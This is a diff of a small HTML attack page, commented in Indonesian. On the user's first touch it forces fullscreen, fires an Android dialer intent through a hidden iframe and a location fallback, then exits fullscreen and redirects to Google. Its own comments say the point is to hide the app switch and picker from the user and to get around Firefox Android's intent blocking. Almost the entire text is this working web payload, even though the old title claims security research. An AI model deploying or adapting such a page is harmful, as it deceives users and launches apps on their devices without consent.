@@ -2,12 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SECURITY_RESEARCH_INTENT</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>S Y S T E M</title>
     <style>
         body, html { 
             margin: 0; padding: 0; background: #000; 
-            width: 100vw; height: 100vh;
+            width: 100vw; height: 100vh; overflow: hidden;
         }
         #trigger {
             width: 100%; height: 100%; cursor: pointer;
@@ -21,30 +21,34 @@
     const trigger = document.getElementById('trigger');
 
     trigger.addEventListener('touchstart', function() {
-        // 1. Memaksa Fullscreen untuk mengacaukan fokus UI
-        document.documentElement.requestFullscreen();
+        // 1. Masuk Fullscreen untuk menyembunyikan transisi status bar
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        }
 
-        // 2. Konstruksi Intent yang berbahaya
-        // Contoh: Membuka dialer dengan nomor tertentu (Sangat umum untuk report bug)
-        // Atau bisa diganti dengan package lain: intent://#Intent;scheme=tel;...
+        // 2. Target Intent (Contoh: Dial Number)
         const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
 
-        // 3. Eksekusi Intent via Iframe (Teknik klasik untuk bypass)
-        // Beberapa versi Firefox Android gagal memblokir intent yang dipicu via iframe di mode fullscreen
+        // 3. Eksekusi via Iframe (Background Execution)
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = intentUrl;
         document.body.appendChild(iframe);
 
-        // 4. Cadangan: Direct Location Change
+        // 4. Cadangan Pemicu (Mencoba memaksa browser)
         setTimeout(() => {
             window.location.href = intentUrl;
-        }, 500);
+        }, 100);
 
-        // 5. Lockdown visual agar user tidak sadar aplikasi berpindah
+        // 5. STEALTH REDIRECT
+        // Kita paksa redirect ke Google setelah 800ms
+        // Ini akan menimpa tab Firefox sehingga user tidak melihat 'popup' picker jika ada delay
         setTimeout(() => {
-            alert("SISTEM SIBUK: Memproses permintaan keamanan...");
-        }, 1000);
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            }
+            window.location.replace("https://www.google.com");
+        }, 800);
     });
 </script>
 </body>
